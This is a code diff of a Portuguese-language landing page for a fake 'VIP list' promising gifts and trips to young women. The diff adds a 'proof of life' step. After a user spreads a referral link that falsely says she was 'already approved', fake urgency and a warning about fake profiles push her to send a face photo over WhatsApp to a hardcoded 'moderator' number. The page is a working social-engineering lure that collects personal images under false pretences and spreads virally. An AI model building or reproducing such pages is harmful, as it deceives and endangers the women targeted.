@@ -45,6 +45,7 @@
       margin: 0 auto 25px;
       font-size: 40px;
       box-shadow: 0 10px 20px rgba(0,176,155,0.3);
+      transition: all 0.5s;
     }
 
     h1 {
@@ -84,7 +85,7 @@
     .vip-title { color: #ffd700; font-weight: 700; font-size: 1.1rem; margin-bottom: 8px; }
     .vip-text { font-size: 0.9rem; color: #fff; opacity: 0.9; margin-bottom: 15px; }
 
-    /* Botão WhatsApp */
+    /* Botões */
     .btn-share {
       display: flex; align-items: center; justify-content: center; gap: 10px;
       width: 100%;
@@ -99,28 +100,30 @@
       box-shadow: 0 4px 15px rgba(37, 211, 102, 0.4);
       animation: pulse 2s infinite;
       cursor: pointer;
+      border: none;
     }
     .btn-share:active { transform: scale(0.98); }
+
+    /* Botão de Validação (O Novo) */
+    .btn-validate {
+      background: linear-gradient(45deg, #ff79c6, #ff6b6b);
+      box-shadow: 0 4px 15px rgba(255, 121, 198, 0.4);
+      animation: none; /* Sem pulso para diferenciar */
+      margin-top: 15px;
+    }
+    .btn-validate:hover { transform: translateY(-2px); }
+
     @keyframes pulse {
       0% { box-shadow: 0 0 0 0 rgba(37, 211, 102, 0.7); }
       70% { box-shadow: 0 0 0 10px rgba(37, 211, 102, 0); }
       100% { box-shadow: 0 0 0 0 rgba(37, 211, 102, 0); }
     }
 
-    /* AREA DESBLOQUEADA (Escondida inicialmente) */
-    #unlocked-area {
-      display: none; /* Escondido */
-      animation: fadeIn 1s ease;
-    }
+    /* AREA DESBLOQUEADA */
+    #unlocked-area { display: none; animation: fadeIn 1s ease; }
     
-    .timeline {
-      text-align: left;
-      margin-top: 20px;
-      padding-left: 10px;
-    }
-    .step {
-      display: flex; gap: 15px; margin-bottom: 20px; opacity: 0.5;
-    }
+    .timeline { text-align: left; margin-top: 20px; padding-left: 10px; }
+    .step { display: flex; gap: 15px; margin-bottom: 20px; opacity: 0.5; }
     .step.active { opacity: 1; }
     .step-icon {
       width: 24px; height: 24px; background: rgba(255,255,255,0.1);
@@ -131,17 +134,17 @@
     .step-content h4 { font-size: 0.95rem; color: #fff; margin-bottom: 2px; }
     .step-content p { font-size: 0.8rem; color: #b39fff; }
 
-    /* Dica Secreta */
-    .secret-tip {
+    /* O NOVO CARD DE VALIDAÇÃO */
+    .verification-card {
       background: rgba(255,255,255,0.08);
-      border-left: 3px solid #ff79c6;
-      padding: 15px;
-      text-align: left;
-      border-radius: 8px;
-      margin-top: 20px;
-      font-size: 0.9rem;
+      border: 1px dashed #ff79c6;
+      padding: 20px;
+      border-radius: 12px;
+      margin-top: 25px;
+      text-align: center;
     }
-    .secret-tip strong { color: #ff79c6; display: block; margin-bottom: 5px; }
+    .verif-title { color: #ff79c6; font-weight: 700; margin-bottom: 8px; font-size: 1rem; }
+    .verif-text { font-size: 0.85rem; color: #e0d4ff; margin-bottom: 15px; line-height: 1.4; }
 
     @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
 
@@ -150,7 +153,7 @@
 <body>
 
   <div class="container">
-    <div class="success-icon">✨</div>
+    <div class="success-icon" id="main-icon">✨</div>
     
     <h1 id="greeting">Parabéns!</h1>
     
@@ -173,7 +176,7 @@
 
     <div id="unlocked-area">
       <div style="background: rgba(0,176,155,0.1); color: #00b09b; padding: 10px; border-radius: 8px; font-weight: 700; margin-bottom: 20px; border: 1px solid #00b09b;">
-        🚀 Indicação Detectada! Prioridade Ativada.
+        🚀 Indicação Detectada!
       </div>
 
       <div class="timeline">
@@ -181,38 +184,39 @@
           <div class="step-icon">✓</div>
           <div class="step-content">
             <h4>Cadastro Recebido</h4>
-            <p>Seus dados estão seguros.</p>
           </div>
         </div>
         <div class="step done">
           <div class="step-icon">✓</div>
           <div class="step-content">
             <h4>Selo de Indicação</h4>
-            <p>Você subiu para o topo da lista.</p>
           </div>
         </div>
-        <div class="step active">
-          <div class="step-icon">⏳</div>
-          <div class="step-content">
-            <h4>Análise de Perfil</h4>
-            <p>Fique atenta ao seu WhatsApp nas próximas 24h. Se formos te chamar, será por lá.</p>
-          </div>
+        
+        <div class="verification-card">
+          <div class="verif-title">⚠️ ÚLTIMA ETAPA: PROVA DE VIDA</div>
+          <p class="verif-text">
+            Muitos perfis fakes tentam entrar. Para provar que você é real e garantir sua vaga hoje, chame a moderadora agora e mande uma foto de rosto.
+          </p>
+          
+          <a href="#" id="admin-chat-btn" class="btn-share btn-validate" target="_blank">
+            <span>📸 MANDAR FOTO E VALIDAR</span>
+          </a>
         </div>
-      </div>
 
-      <div class="secret-tip">
-        <strong>💡 Dica da Moderadora:</strong>
-        "Quando nossa equipe te chamar no Zap, responda rápido e mande uma foto de rosto sorrindo. Meninas simpáticas conseguem mimos 3x mais rápido."
       </div>
     </div>
 
   </div>
 
   <script>
-    // 1. CONFIGURAÇÃO: Coloque aqui o link do seu site
+    // 1. CONFIGURAÇÃO
     const SITE_BASE = "https://mp-rust-phi.vercel.app"; 
+    
+    // COLOQUE AQUI O SEU NÚMERO DO WHATSAPP (Aquele que vai receber a foto)
+    const SEU_NUMERO_WHATSAPP = "5511999999999"; 
 
-    // 2. Lógica de Nomes
+    // 2. Lógica de Nomes e Indicação
     const params = new URLSearchParams(window.location.search);
     let nomeMadrinha = params.get('nome');
     
@@ -224,28 +228,25 @@
         document.getElementById('greeting').innerText = `Parabéns, ${primeiroNome}!`;
     }
 
-    // 3. Monta o Link
+    // Link para indicação
     const linkComRastreio = `${SITE_BASE}?indicada_por=${encodeURIComponent(nomeMadrinha)}`;
-    const mensagem = `Amigaaa! 🤫 Consegui entrar na lista VIP daquele site de mimos e viagens. Como eu já fui aprovada, se você usar meu link a gente ganha prioridade juntas.\n\nCorre antes que feche: ${linkComRastreio}`;
-    const linkZap = `https://api.whatsapp.com/send?text=${encodeURIComponent(mensagem)}`;
-    
-    const btn = document.getElementById('whatsapp-btn');
-    btn.href = linkZap;
+    const mensagemIndica = `Amigaaa! 🤫 Consegui entrar na lista VIP daquele site de mimos e viagens. Como eu já fui aprovada, se você usar meu link a gente ganha prioridade juntas.\n\nCorre antes que feche: ${linkComRastreio}`;
+    document.getElementById('whatsapp-btn').href = `https://api.whatsapp.com/send?text=${encodeURIComponent(mensagemIndica)}`;
 
-    // 4. O PULO DO GATO: Detectar o clique e mudar a tela
-    btn.addEventListener('click', function() {
-      // Espera 2 segundos (simulando que ela foi pro zap e voltou) e muda a tela
+    // Link para falar com ADMIN (Passo Final)
+    const msgAdmin = `Oii, sou a ${nomeMadrinha}! Acabei de fazer meu cadastro e indicar uma amiga. Quero validar meu perfil pra não perder a vaga. Aqui está minha foto:`;
+    document.getElementById('admin-chat-btn').href = `https://api.whatsapp.com/send?phone=${5511957790101}&text=${encodeURIComponent(msgAdmin)}`;
+
+    // 3. Efeito de Desbloqueio
+    document.getElementById('whatsapp-btn').addEventListener('click', function() {
       setTimeout(() => {
-        // Esconde a caixa de pedir indicação
         document.getElementById('vip-box').style.display = 'none';
         document.getElementById('main-status').style.display = 'none';
+        document.getElementById('main-icon').innerHTML = "📸"; // Muda o ícone para câmera
         
-        // Mostra a área desbloqueada
         document.getElementById('unlocked-area').style.display = 'block';
-        
-        // Muda o título para celebrar
-        document.getElementById('greeting').innerText = "Tudo pronto!";
-      }, 1500);
+        document.getElementById('greeting').innerText = "Só falta isso!";
+      }, 2000);
     });
 
   </script>
